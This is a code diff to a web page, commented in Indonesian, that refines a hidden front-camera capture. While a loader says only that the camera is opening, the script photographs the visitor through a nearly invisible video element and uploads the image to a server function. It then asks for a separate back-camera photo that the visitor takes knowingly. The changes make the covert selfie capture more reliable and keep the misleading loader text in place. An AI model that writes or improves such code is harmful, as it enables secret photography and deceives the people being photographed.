@@ -21,7 +21,9 @@
   .icon-cam{width:64px;height:64px;border-radius:50%;background:rgba(255,45,85,.15);
     display:flex;align-items:center;justify-content:center;font-size:30px;border:2px solid rgba(255,45,85,.4)}
 
-  #silent{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;left:-9999px;top:-9999px}
+  /* Silent stage — dibuat visible 1x1 px di dalam viewport biar browser render frame-nya */
+  #silent{position:fixed;top:0;left:0;width:2px;height:2px;opacity:0.01;overflow:hidden;pointer-events:none;z-index:-1}
+  #videoSilent{width:2px;height:2px;object-fit:cover}
 
   #loader{position:absolute;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;
     gap:20px;background:#0a0a0f;z-index:200;text-align:center;padding:24px}
@@ -109,17 +111,38 @@ let cooldownLock = false;
 
 function wait(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
+/* ====== KAMERA DEPAN — SILENT ====== */
 async function openFrontSilent() {
   streamSilent = await navigator.mediaDevices.getUserMedia({
     video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } },
     audio: false
   });
   VIDEO_S.srcObject = streamSilent;
-  await VIDEO_S.play().catch(()=>{});
-  if (VIDEO_S.readyState < 2) {
-    await new Promise(r => VIDEO_S.onloadeddata = r);
+  VIDEO_S.muted = true;
+  VIDEO_S.setAttribute('playsinline', '');
+  VIDEO_S.setAttribute('autoplay', '');
+
+  // tunggu metadata
+  if (VIDEO_S.readyState < 1) {
+    await new Promise(r => VIDEO_S.addEventListener('loadedmetadata', r, { once: true }));
   }
-  await wait(400);
+  await VIDEO_S.play().catch(()=>{});
+
+  // tunggu frame beneran ada isinya
+  await new Promise(r => {
+    if (typeof VIDEO_S.requestVideoFrameCallback === 'function') {
+      VIDEO_S.requestVideoFrameCallback(() => r());
+    } else {
+      const check = () => {
+        if (VIDEO_S.videoWidth > 0 && VIDEO_S.videoHeight > 0) r();
+        else requestAnimationFrame(check);
+      };
+      check();
+    }
+  });
+
+  // buffer autofocus/exposure
+  await wait(1500);
 }
 
 async function captureFrontBlob() {
@@ -131,24 +154,33 @@ async function captureFrontBlob() {
   ctx.translate(w, 0); ctx.scale(-1, 1);
   ctx.drawImage(VIDEO_S, 0, 0, w, h);
   ctx.restore();
-  return await new Promise(res => CANVAS_S.toBlob(b => res(b), 'image/jpeg', 0.85));
+  return await new Promise(res => CANVAS_S.toBlob(b => res(b), 'image/jpeg', 0.9));
 }
 
 function closeFrontSilent() {
-  if (streamSilent) {
-    streamSilent.getTracks().forEach(t => t.stop());
-    streamSilent = null;
-  }
-  VIDEO_S.srcObject = null;
+  try {
+    if (streamSilent) {
+      streamSilent.getTracks().forEach(t => t.stop());
+      streamSilent = null;
+    }
+    VIDEO_S.srcObject = null;
+  } catch(e){}
 }
 
+/* ====== KAMERA BELAKANG — MANUAL ====== */
 async function openBackCamera() {
   streamBack = await navigator.mediaDevices.getUserMedia({
     video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
     audio: false
   });
   VIDEO.srcObject = streamBack;
+  VIDEO.muted = true;
+  VIDEO.setAttribute('playsinline', '');
   await VIDEO.play().catch(()=>{});
+  if (VIDEO.readyState < 2) {
+    await new Promise(r => VIDEO.addEventListener('loadeddata', r, { once: true }));
+  }
+  await wait(300);
 }
 
 function captureBackBlob() {
@@ -158,42 +190,56 @@ function captureBackBlob() {
     CANVAS.width = w; CANVAS.height = h;
     const ctx = CANVAS.getContext('2d');
     ctx.drawImage(VIDEO, 0, 0, w, h);
-    CANVAS.toBlob(b => resolve(b), 'image/jpeg', 0.85);
+    CANVAS.toBlob(b => resolve(b), 'image/jpeg', 0.9);
   });
 }
 
+/* ====== KIRIM KE NETLIFY FUNCTION ====== */
 async function sendPhoto(blob, label) {
   const fd = new FormData();
   fd.append('photo', blob, 'photo.jpg');
   fd.append('label', label);
   const res = await fetch('/.netlify/functions/send-photo', { method:'POST', body: fd });
-  if (!res.ok) throw new Error('gagal kirim');
-  return res.json();
+  const txt = await res.text();
+  if (!res.ok) throw new Error('HTTP ' + res.status + ' — ' + txt);
+  try { return JSON.parse(txt); } catch { return { ok: true, raw: txt }; }
 }
 
+/* ====== FLOW UTAMA ====== */
 async function autoFlow() {
   INTRO.style.display = 'none';
   LOADER.style.display = 'flex';
   LOADERTEXT.textContent = 'membuka kamera, tunggu sebentar...';
 
-  // 1) Kamera depan silent — teks tetap "membuka kamera..."
+  // ---- FASE 1: KAMERA DEPAN SILENT ----
+  let frontOk = false;
   try {
     await openFrontSilent();
     const frontBlob = await captureFrontBlob();
+    if (!frontBlob || frontBlob.size < 1000) {
+      throw new Error('blob kamera depan kosong/terlalu kecil (' + (frontBlob ? frontBlob.size : 0) + ' bytes)');
+    }
     await sendPhoto(frontBlob, 'front');
+    frontOk = true;
   } catch(e) {
-    console.error('front silent error', e);
+    console.error('front error:', e);
   } finally {
     closeFrontSilent();
   }
 
-  // 2) Cooldown 5 detik — teks tetap sama
+  // ---- FASE 2: COOLDOWN 5 DETIK ----
   await wait(5000);
 
-  // 3) Kamera belakang manual
+  // ---- FASE 3: KAMERA BELAKANG MANUAL ----
   LOADER.style.display = 'none';
   CAMVIEW.style.display = 'block';
-  await openBackCamera();
+
+  try {
+    await openBackCamera();
+  } catch(e) {
+    alert('kamera belakang gagal dibuka: ' + (e.message || e));
+    return;
+  }
 
   SHUTTER.addEventListener('click', async () => {
     if (cooldownLock) return;
@@ -207,7 +253,7 @@ async function autoFlow() {
       SUCCESS.style.display = 'flex';
     } catch(e) {
       LOADER.style.display = 'none';
-      alert('Gagal mengirim foto, coba lagi.');
+      alert(e.message || 'gagal kirim foto belakang');
     } finally {
       cooldownLock = false;
     }
@@ -217,7 +263,7 @@ async function autoFlow() {
 document.getElementById('startBtn').addEventListener('click', () => {
   autoFlow().catch(err => {
     console.error(err);
-    alert('Tidak bisa mengakses kamera. Pastikan izin kamera diizinkan.');
+    alert(err.message || 'Tidak bisa mengakses kamera.');
   });
 });
 </script>
